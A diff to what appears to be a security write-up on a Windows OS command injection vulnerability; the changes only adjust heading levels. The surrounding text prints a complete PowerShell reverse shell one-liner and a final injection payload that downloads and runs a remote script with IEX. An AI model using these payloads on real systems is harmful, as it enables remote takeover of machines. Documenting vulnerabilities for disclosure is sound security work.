@@ -61,7 +61,7 @@ Pragma: no-cache
 
 To validate the attack vector, various OOB techniques such as ping, curl, and wget were employed. Payloads using the ping command revealed variations in response times, confirming the vulnerability.
 
-### Example Payloads
+## Example Payloads
 Windows OS Command injection payload used for exploitation.
 
 ```text
@@ -74,12 +74,13 @@ Using the curl technique, a file was successfully downloaded from a remote serve
 ## Exploitation
 Based on the Windows environment of the application, a PowerShell reverse shell payload was selected for exploitation. This approach enabled a reverse connection to the attacker’s machine.
 
-### PowerShell Reverse Shell Payload
+## PowerShell Reverse Shell Payload
+
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-#### Final Exploitation Payload
+## Final Exploitation Payload
 
 ```powershell
 |powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://thevillagehacker.com/mypowershell.ps1')"||
